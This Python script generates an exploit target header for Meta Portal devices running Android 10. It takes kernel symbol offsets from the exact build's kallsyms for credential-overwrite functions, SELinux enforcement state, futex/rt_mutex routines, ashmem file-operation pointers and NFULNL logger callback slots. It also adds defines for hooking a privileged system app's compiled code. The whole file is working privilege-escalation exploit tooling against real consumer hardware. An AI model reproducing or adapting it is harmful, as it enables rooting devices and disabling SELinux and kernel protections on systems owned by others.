#!/usr/bin/env python3
"""Generate the second-generation Portal 10 target from exact-build kallsyms.

Omni, Cipher, and Terry use Meta's Linux 4.9.227 tree with the same exploit-relevant
configuration and structure layout.  Symbol values must still come from the
exact Omni boot image because its device drivers move portions of text and
data independently.
"""

from pathlib import Path
import re
import shutil
import sys


BASE = 0xFFFFFF8008080000


def load_symbols(path: Path) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        fields = line.split()
        if len(fields) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", fields[0]):
            symbols[fields[-1]] = int(fields[0], 16)
    return symbols


def main() -> None:
    if len(sys.argv) != 4:
        raise SystemExit(
            "usage: generate_omni_target.py INSTALLED_KALLSYMS "
            "PORTAL_GO_TARGET OUTPUT"
        )

    symbols = load_symbols(Path(sys.argv[1]))
    template = Path(sys.argv[2])
    output = Path(sys.argv[3])
    output.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(template, output)
    text = output.read_text(encoding="utf-8")

    symbol_macros = {
        "COMMIT_CREDS_OFF": "commit_creds",
        "PREPARE_KERNEL_CRED_OFF": "prepare_kernel_cred",
        "OVERRIDE_CREDS_OFF": "override_creds",
        "GET_TASK_CRED_OFF": "get_task_cred",
        "INIT_TASK_OFF": "init_task",
        "INIT_UTS_NS_OFF": "init_uts_ns",
        "INIT_CRED_OFF": "init_cred",
        "INIT_USER_NS_OFF": "init_user_ns",
        "INIT_GROUPS_OFF": "init_groups",
        "MEMSTART_ADDR_OFF": "memstart_addr",
        "MODULE_ALLOC_BASE_OFF": "module_alloc_base",
        "RESERVED_MEM_OFF": "reserved_mem",
        "EMPTY_ZERO_PAGE_OFF": "empty_zero_page",
        "ROOT_TASK_GROUP_OFF": "root_task_group",
        "KPTR_RESTRICT_OFF": "kptr_restrict",
        "SYSCALL_BOOTID_OFF": "sysctl_bootid",
        "NFULNL_LOGGER_OFF": "nfulnl_logger",
        "ASHMEM_FOPS_OFF": "ashmem_fops",
        "ASHMEM_MISC_OFF": "ashmem_misc",
        "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
        "ASHMEM_COMPAT_IOCTL_OFF": "compat_ashmem_ioctl",
        "ASHMEM_MMAP_OFF": "ashmem_mmap",
        "ASHMEM_OPEN_OFF": "ashmem_open",
        "ASHMEM_RELEASE_OFF": "ashmem_release",
        "ASHMEM_READ_ITER_OFF": "ashmem_read",
        "ASHMEM_LLSEEK_OFF": "ashmem_llseek",
        "NOOP_LLSEEK_OFF": "noop_llseek",
        "GENERIC_FILE_LLSEEK_OFF": "generic_file_llseek",
        "GENERIC_FILE_SPLICE_READ_OFF": "generic_file_splice_read",
        "DEFAULT_FILE_SPLICE_READ_OFF": "default_file_splice_read",
        "KERNEL_WRITE_OFF": "kernel_write",
        "FGET_OFF": "fget",
        "FPUT_OFF": "fput",
        "SYS_IOCTL_OFF": "SyS_ioctl",
        "CONFIGFS_READ_FILE_OFF": "configfs_read_file",
        "CONFIGFS_WRITE_FILE_OFF": "configfs_write_file",
        "CONFIGFS_READ_BIN_FILE_OFF": "configfs_read_bin_file",
        "CONFIGFS_WRITE_BIN_FILE_OFF": "configfs_write_bin_file",
        "CONFIGFS_OPEN_BIN_FILE_OFF": "configfs_open_bin_file",
        "CONFIGFS_RELEASE_BIN_FILE_OFF": "configfs_release_bin_file",
        "KMALLOC_CACHES_OFF": "kmalloc_caches",
        "ANON_PIPE_BUF_OPS_OFF": "anon_pipe_buf_ops",
        "ANON_PIPE_BUF_NOMERGE_OPS_OFF": "anon_pipe_buf_nomerge_ops",
        "SELINUX_STATE_OFF": "selinux_enforcing",
        "SELINUX_ENFORCING_BOOT_OFF": "selinux_enforcing",
        "SECURITY_HOOK_HEADS_OFF": "security_hook_heads",
        "RT_MUTEX_START_PROXY_LOCK_OFF": "rt_mutex_start_proxy_lock",
        "REMOVE_WAITER_OFF": "remove_waiter",
        "RT_MUTEX_SLOWLOCK_OFF": "rt_mutex_slowlock",
        "RT_MUTEX_SETPRIO_OFF": "rt_mutex_setprio",
        "FUTEX_REQUEUE_OFF": "futex_requeue",
        "FUTEX_LOCK_PI_OFF": "futex_lock_pi",
        "FUTEX_WAKE_OFF": "futex_wake",
        "KALLSYMS_LOOKUP_NAME_OFF": "kallsyms_lookup_name",
        "SLIDE_NFULNL_LOGGER_OFF": "nfulnl_logger",
        "SLIDE_SYSCTL_BOOTID_OFF": "sysctl_bootid",
        "SLIDE_INIT_TASK_OFF": "init_task",
        "SLIDE_ROOT_TASK_GROUP_OFF": "root_task_group",
        "SLIDE_IDLE_RT_MUTEX_OFF": "msm_bus_dbg_cllist_lock",
        "SLIDE_PROC_UID_LOCK_OFF": "proc_uid_lock",
    }
    missing = sorted(set(symbol_macros.values()) - symbols.keys())
    if missing:
        raise SystemExit("missing required symbols: " + ", ".join(missing))

    values = {
        macro: f"0x{symbols[symbol] - BASE:08x}ULL"
        for macro, symbol in symbol_macros.items()
    }
    values.update(
        {
            "BUILD_VARIANT_LABEL": '"portal_omni_3051355900018050"',
            "BUILD_FINGERPRINT": (
                '"Facebook/omni_prod/omni:10/QKQ1.210213.001/'
                '3051355900018050:user/prod-keys"'
            ),
            # struct miscdevice stores its mutable fops pointer at +0x10.
            "ASHMEM_MISC_FOPS_OFF": (
                f"0x{symbols['ashmem_misc'] + 0x10 - BASE:08x}ULL"
            ),
            # loggers[0][1] is the first writable NFULNL callback slot.
            "LOGGERS_0_1_OFF": f"0x{symbols['loggers'] + 8 - BASE:08x}ULL",
            # loggers[12][1] is followed by alignment padding, making its
            # collateral rb_erase store harmless.
            "SLIDE_LOGGERS_0_1_OFF": (
                f"0x{symbols['loggers'] + 25 * 8 - BASE:08x}ULL"
            ),
            # random_table[5].data; sizeof(struct ctl_table)=0x40.
            "SLIDE_RANDOM_BOOT_ID_DATA_OFF": (
                f"0x{symbols['random_table'] + 5 * 0x40 + 8 - BASE:08x}ULL"
            ),
            "SELINUX_ENFORCING": "(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)",
            "SELINUX_BLOB_SIZES": "(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)",
        }
    )

    text = text.replace(
        "#define TASK_PI_USES_LEFTMOST 1",
        "#define CONFIGFS_ZERO_GUARD_SIZE 32\n"
        "#define CONFIGFS_BINARY_CLEANUP 1\n"
        "#define UID1000_ART_TARGET \\\n"
        "  \"/data/dalvik-cache/arm64/"
        "system@priv-app@PlatformSecureStateService@\" \\\n"
        "  \"PlatformSecureStateService.apk@classes.dex\"\n"
        "#define UID1000_ART_ONCREATE_OFFSET 0x000095b0\n"
        "#define UID1000_ART_HOOK_OFFSET 0x0001ce00\n"
        "#define UID1000_ART_ORIGINAL_EXECUTABLE_SIZE "
        "0x0000000000015c70ULL\n"
        "#define UID1000_ART_EXTENDED_EXECUTABLE_SIZE "
        "0x0000000000015ed8ULL\n"
        "#define TASK_PI_USES_LEFTMOST 1",
        1,
    )

    for name, value in values.items():
        pattern = rf"(?m)^#define\s+{re.escape(name)}\s+.*$"
        text, count = re.subn(pattern, f"#define {name} {value}", text)
        if count != 1:
            raise SystemExit(f"expected one {name} definition, found {count}")

    text = text.replace(
        "Facebook Portal Go (terry), Android 10, Linux 4.9.227-perf+",
        "Meta Portal 10-inch (omni), Android 10, Linux 4.9.227-perf+",
    )
    text = text.replace(
        "installed 5051355900018050 kernel image",
        "installed 3051355900018050 kernel image",
    )
    output.write_text(text, encoding="utf-8", newline="\n")


if __name__ == "__main__":
    main()
